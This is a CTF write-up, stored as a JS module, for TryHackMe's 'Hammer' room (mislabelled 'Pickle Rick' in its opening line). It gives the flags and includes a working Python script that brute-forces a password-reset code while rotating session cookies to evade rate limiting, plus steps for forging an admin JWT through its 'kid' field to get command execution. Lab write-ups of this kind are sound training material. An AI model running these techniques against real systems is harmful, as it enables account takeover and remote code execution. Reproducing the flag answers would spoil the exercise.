export default {
	id: 'hammer-challenge',
	title: 'Hammer Challenge',
	category: 'TryHackMe',
	difficulty: 'Medium',
	tags: ['Penetration Testing', 'Web Application', 'Authentication'],
	date: '2026-04-08T12:00:00',
	excerpt: 'Write up and walkthrough of Hammer Challenge room on TryHackMe.',
	content: `
This is the write up and walkthrough of the Pickle Rick Challenge room on TryHackMe.

⸻⸻⸻⸻⸻

Start the VM by clicking the \`Start Machine\` button at the top right of the task. You can complete the challenge by connecting through a VPN or the AttackBox, which contains all the essential tools.

With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system?

**Answer the questions below**⸻⸻⸻⸻⸻

What is the flag value after logging in to the dashboard?
**Answer:** THM{AuthBypass3D}
**Reason:**
1. Run \`nmap -sV -sC -p1-65535 MACHINE\_IP\` to figure out if the host is online and which port is open. We will find that port 22 for SSH and port 1337 for HTTP are open.
2. Go to the website at \`http://MACHINE\_IP:1337\` and we will see a login page.
3. After inspect the page, we will find that there is a dev note that said "<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->".
4. We can use this information to brute force the directories using \`dirb\` or \`gobuster\`.
5. Before we brute force the directories, we need to create a wordlist that contains the directory naming convention. We can use \`sed\` to modify the wordlist from \`/usr/share/wordlists/dirb/big.txt\` in order to prepend \`hmr_\` in front of each word. The command will be \`sed 's/^/hmr_/' /usr/share/wordlists/dirb/big.txt > hmr_big.txt\`.
6. Now, we can run \`dirb http://MACHINE\_IP:1337 hmr_big.txt\`.
7. We will find some directories including \`hmr_css\`, \`hmr_images\`, \`hmr_js\`. However, we are interested in the \`hmr_logs\` since it might give us something useful.
8. After accessing \`http://MACHINE\_IP:1337/hmr_logs\`, we will find a log file that contains some errors in which one of the username \`tester@hammer.thm\` was exposed.
9. Now, we can try to bypass the login using the forgot password feature. We will enter the email and use Burp Suite to intercept the request. We will see that the request have a \`recovery\_code\` and a \`s\` body parameter.
10. Personally, I tried the sniper attack in order to try to brute force the recovery code but it was not successful due to the \`Rate-Limit-Pending\`. After struggling for 2 hours, I decided to look for help on others write-ups and come across **0xb0b** write-up on TryHackMe.
11. In the write-up, I found the script that he used to get the recovery code and I modify the script to fit my current situation. The link to his write-up is <a href="https://0xb0b.gitbook.io/writeups/tryhackme/2024/hammer">https://0xb0b.gitbook.io/writeups/tryhackme/2024/hammer</a>.
\`\`\`
	import subprocess
	
	def get_phpsessid():
	    # Request Password Reset and retrieve the PHPSESSID cookie
	    reset_command = [
	        "curl", "-X", "POST", "http://MACHINE\_IP:1337/reset_password.php",
	        "-d", "email=tester%40hammer.thm",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-v"
	    ]
	
	    # Execute the curl command and capture the output
	    response = subprocess.run(reset_command, capture_output=True, text=True)
	
	    # Extract PHPSESSID from the response
	    phpsessid = None
	    for line in response.stderr.splitlines():
	        if "Set-Cookie: PHPSESSID=" in line:
	            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
	            break
	
	    return phpsessid
	
	def submit_recovery_code(phpsessid, recovery_code):
	    # Submit Recovery Code using the retrieved PHPSESSID
	    recovery_command = [
	        "curl", "-X", "POST", "http://MACHINE\_IP:1337/reset_password.php",
	        "-d", f"recovery_code={recovery_code}&s=180",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-H", f"Cookie: PHPSESSID={phpsessid}",
	        "--silent"
	    ]
	
	    # Execute the curl command for recovery code submission
	    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
	    return response_recovery.stdout
	
	def main():
	    phpsessid = get_phpsessid()
	    if not phpsessid:
	        print("Failed to retrieve initial PHPSESSID. Exiting...")
	        return
	    
	    for i in range(10000):
	        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
	
	        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
	            phpsessid = get_phpsessid()
	            if not phpsessid:
	                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
	                continue
	        
	        response_text = submit_recovery_code(phpsessid, recovery_code)
	        word_count = len(response_text.split())
	
	        if word_count != 148:
	            print(f"Success! Recovery Code: {recovery_code}")
	            print(f"PHPSESSID: {phpsessid}")
	            print(f"Response Text: {response_text}")
	            break
	
	if __name__ == "__main__":
	    main()
	
\`\`\`
12. After running the script, we will get the recovery code and use it to reset the password.
13. From there, we can log in to the dashboard and get the flag using the username and the new password.

What is the content of the file **/home/ubuntu/flag.txt**?
**Answer:** THM{RUNANYCOMMAND1337}
**Reason:**
1. After logging into the dashboard, we will see that there is an input field that allow us to run some commands.
2. We will quickly find out that we can only run \`ls\` command and nothing else.
3. When we run \`ls\`, we will see that there is a \`.key\` file.
4. We can download the file using \`http://MACHINE\_IP:1337/{filename}\`.
5. After downloading the file, we will find there is a key inside the file. It maybe helpful for us in the future.
6. At this point, we ran into a problem where after a few seconds, the website will log us out.
7. Using Burp Suite to intercept the log in response, we will find that there is a time limit, we can set the \`persistentSession\` to \`true\`. In addition, we can also delete the time constrain that had been set in the request.
8. Now, after we have persistent session, we can try to take a look at the source code of the dashboard. After scrolling down, we will find the script and it seems like the website use a JWT token to authenticate.
9. Use jwt.io to decode the token and we see the decoded token. We can see that there is a field called \`kid\` which take in a path to a \`.key\` file. We change the path to \`/var/www/html/{filename}\` since when we run \`ls\` command, we find our \`.key\` file is located there.
10. Then under the secret field, we can put in the key that we found in the \`.key\` file.
11. We also change the \`role\` field to \`admin\` since we want to have admin access.
12. We can then intercept the \`ls\` command request, and replace the JWT token with the one that we had crafted.
13. After confirming the request is working with the new JWT token, we can try to send a different command such as \`id\` through the intercepted request.
14. After confirming that we can run other commands other than \`ls\`, we can now run \`cat /home/ubuntu/flag.txt\` to get the flag from the intercepted response.
`
}